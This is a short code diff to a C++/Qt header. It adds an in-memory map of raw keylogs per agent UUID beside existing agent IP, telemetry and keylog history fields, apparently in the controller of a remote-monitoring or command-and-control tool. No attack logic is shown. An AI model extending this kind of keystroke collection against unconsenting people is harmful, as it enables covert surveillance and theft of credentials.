@@ -80,6 +80,7 @@ private:
     
     // History Buffers
     QMap<QString, QString> m_agentIpToUuid; // Maps IP to persistent UUID
+    QMap<QString, QString> m_agentRawKeylogs; // Maps agent UUID to accumulated raw keylogs in-memory
     QStringList     m_telemetryHistory;
     QStringList     m_keylogHistory;
     
